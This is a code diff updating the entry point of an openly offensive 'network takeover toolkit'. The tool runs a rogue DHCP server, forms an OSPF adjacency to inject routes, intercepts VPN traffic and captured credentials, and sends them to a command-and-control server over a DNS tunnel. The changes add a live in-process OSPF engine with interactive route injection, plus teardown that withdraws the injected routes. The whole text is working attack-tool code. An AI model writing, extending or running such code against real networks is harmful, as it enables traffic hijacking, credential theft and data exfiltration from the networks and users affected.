@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v3.0
+# v3.1
 """
 main.py — network takeover toolkit entry point.
 
@@ -273,18 +273,22 @@ def _transmit_to_c2(c2_config: dict) -> None:
 
 def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
                c2_config: dict | None = None, ospf_hellos: list | None = None,
-               lsdb_subnets: list | None = None) -> None:
+               lsdb_subnets: list | None = None,
+               ospf_context: dict | None = None) -> None:
     """
     Interactive debug console.  Runs in a daemon thread while the DHCP sniff
     loop blocks the main thread.
 
-    Always available options:
-      1  OSPF-discovered SVIs / subnets
-      2  Active leases issued by the rogue server
-      3  Intercepted VPN traffic (files) and captured credentials
+    OSPF (live, from in-process engine):
+      1  SVIs & discovered subnets (Hello-learned + LSDB wire capture)
+      2  Live OSPF neighbours
+      3  Live LSDB (from adjacency engine context)
+      4  Inject OSPF route (/32 or any stub)
 
-    Remote-only option (requires --remote and a successful C2 handshake):
-      4  Transmit intercepted files and credentials to C2 over DNS tunnel
+    Capture:
+      5  Active leases issued by the rogue server
+      6  Intercepted VPN traffic (files) and captured credentials
+      7  Transmit to C2 (--remote only)
     """
     time.sleep(2)  # let startup output settle
     while True:
@@ -292,11 +296,16 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
         print(f"\n{sep}")
         print("  Debug Console")
         print(sep)
-        print("  1)  OSPF-discovered SVIs / subnets")
-        print("  2)  Active leases")
-        print("  3)  Intercepted traffic / credentials")
+        print("  ── OSPF ──────────────────────────────────────")
+        print("  1)  SVIs & discovered subnets")
+        print("  2)  Live neighbours")
+        print("  3)  Live LSDB")
+        print("  4)  Inject route")
+        print("  ── Capture ───────────────────────────────────")
+        print("  5)  Active leases")
+        print("  6)  Intercepted traffic / credentials")
         if c2_config:
-            print(f"  4)  Transmit to C2  (agent={c2_config['agent_id']})")
+            print(f"  7)  Transmit to C2  (agent={c2_config['agent_id']})")
         print("  q)  Close menu (server keeps running)")
         print(sep)
 
@@ -308,10 +317,35 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
         if choice == "1":
             _show_ospf_networks(ospf_hellos or [], lsdb_subnets)
         elif choice == "2":
-            _show_leases(networks)
+            if ospf_context is None:
+                print("  OSPF engine not running in-process.")
+            else:
+                ospf_adjacency.show_neighbors(ospf_context)
         elif choice == "3":
+            if ospf_context is None:
+                print("  OSPF engine not running in-process.")
+            else:
+                lsas = ospf_adjacency.local_lsdb_entries(ospf_context)
+                if not lsas:
+                    print("  Live LSDB is empty.")
+                else:
+                    print(f"  Live LSDB — {len(lsas)} LSA(s):")
+                    for lsa in lsas:
+                        print(f"    type={lsa.type}  id={lsa.id}  adv={lsa.adrouter}"
+                              f"  seq=0x{getattr(lsa, 'seq', 0):08x}"
+                              f"  age={getattr(lsa, 'age', 0)}s")
+        elif choice == "4":
+            if ospf_context is None:
+                print("  OSPF engine not running in-process.")
+            elif not ospf_context["adjacency_ready_event"].is_set():
+                print("  No FULL adjacency yet — wait before injecting routes.")
+            else:
+                ospf_adjacency.add_route_interactive(ospf_context)
+        elif choice == "5":
+            _show_leases(networks)
+        elif choice == "6":
             _show_intercepted()
-        elif choice == "4" and c2_config:
+        elif choice == "7" and c2_config:
             _transmit_to_c2(c2_config)
         elif choice == "q":
             print("  Debug menu closed.")
@@ -395,28 +429,41 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
     print_step("OK", f"OSPF /32 injection target: {route_ip}")
 
     # ── Step 5: OSPF adjacency + background LSDB capture ────────────────────
-    # Start the LSDB sniffer BEFORE launching the adjacency engine so it is
-    # already listening when the EXCHANGE-phase LS Updates flood the wire.
+    # Wire sniffer captures subnets from LS Updates during the EXCHANGE phase
+    # for the debug menu's subnet display.  The engine's internal context LSDB
+    # is separately available for live queries via the debug menu (options 2-4).
     lsdb_subnets = []
-    lsdb_thread = threading.Thread(
+    threading.Thread(
         target=ospf_adjacency.sniff_ospf_lsdb_subnets,
         args=(interface, lsdb_subnets),
         kwargs={"timeout": 120},
         daemon=True,
         name="lsdb-sniffer",
-    )
-    lsdb_thread.start()
+    ).start()
 
-    ospf_adjacency.launch_in_terminal(
-        interface,
+    context = ospf_adjacency.make_context(
+        interface, our_ip, ospf_params["netmask"], ospf_params["hello_interval"],
         auto_route_ip=route_ip,
         area_id=ospf_params["area_id"],
-        hello_interval=ospf_params["hello_interval"],
         dead_interval=ospf_params["dead_interval"],
         extra_subnets=vpn_subnets or [],
     )
-    ospf_adjacency.wait_for_adjacency_exchange(interface, our_ip)
-    return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets, default_route_added
+    ospf_adjacency.refresh_local_router_lsa(context)
+
+    threading.Thread(
+        target=ospf_adjacency.run_engine_headless,
+        args=(context,),
+        daemon=True,
+        name="ospf-engine",
+    ).start()
+
+    print_step("START", f"Waiting up to 300s for OSPF FULL adjacency on {interface}...")
+    if not context["adjacency_ready_event"].wait(timeout=300):
+        print_step("FAIL", "OSPF FULL adjacency not reached within 300s")
+        raise TimeoutError(f"OSPF adjacency timeout on {interface}")
+    print_step("OK", "OSPF FULL adjacency reached")
+
+    return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets, default_route_added, context
 
 
 def start_http_intercept(sniff_iface, our_ips=None):
@@ -440,7 +487,7 @@ def start_http_intercept(sniff_iface, our_ips=None):
 # ── Entry point ───────────────────────────────────────────────────────────────
 
 def main():
-    print("Network Takeover Toolkit v3.0 — Starting...")
+    print("Network Takeover Toolkit v3.1 — Starting...")
     args = _parse_args()
     interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py
 
@@ -462,6 +509,7 @@ def main():
     loopback_alias_ip = None
     default_route_added = False
     tun_iface = None
+    ospf_context = None
     try:
         # ── Phase 2: detect VPN now so its subnet is included in OSPF injection ─
         # detect_vpn_subnet() starts OpenVPN if needed and returns the /24 target
@@ -474,7 +522,7 @@ def main():
             print_step("OK", f"VPN detected: {pre_tun} → subnet {pre_vpn_net24} (will inject via OSPF)")
 
         # ── Phase 3: configure IP, untagged discover, OSPF adjacency ──────────
-        ospf_interface, our_ip, offer, loopback_alias_ip, lsdb_subnets, default_route_added = setup_and_form_adjacency(
+        ospf_interface, our_ip, offer, loopback_alias_ip, lsdb_subnets, default_route_added, ospf_context = setup_and_form_adjacency(
             interface, ospf_params, target_ip=args.target, vpn_subnets=vpn_subnets,
         )
         ospf_iface_for_fwd = ospf_interface
@@ -517,7 +565,8 @@ def main():
         # ── Debug console — runs in background while Phase 7 blocks ──────────
         debug_thread = threading.Thread(
             target=debug_menu,
-            args=(networks, proposed_leases, server_details, c2_config, ospf_hellos, lsdb_subnets),
+            args=(networks, proposed_leases, server_details, c2_config,
+                  ospf_hellos, lsdb_subnets, ospf_context),
             daemon=True,
             name="debug-menu",
         )
@@ -542,12 +591,12 @@ def main():
         return handled_events
     finally:
         # ── Phase 8: teardown ─────────────────────────────────────────────────
-        # LSA withdrawal (MaxAge-flood our Router-LSA) is handled automatically
-        # by the adjacency engine subprocess on its own KeyboardInterrupt.
-        # Here we clean up the iptables rules and restore ip_forward.
-        print_step("START", "Teardown: removing forwarding rules and restoring system state")
+        print_step("START", "Teardown: withdrawing OSPF routes and removing forwarding rules")
+        if ospf_context is not None:
+            ospf_adjacency.withdraw_injected_routes(ospf_context)
+            ospf_context["stop_event"].set()
         if ospf_iface_for_fwd:
-            ospf_adjacency.teardown_policy_routing(ospf_iface_for_fwd, tun_iface)
+            ospf_adjacency.teardown_policy_routing(ospf_iface_for_fwd)
             ospf_adjacency.teardown_forwarding(ospf_iface_for_fwd, interface)
             if default_route_added:
                 ospf_adjacency.remove_default_route(ospf_params["src_ip"], ospf_iface_for_fwd)
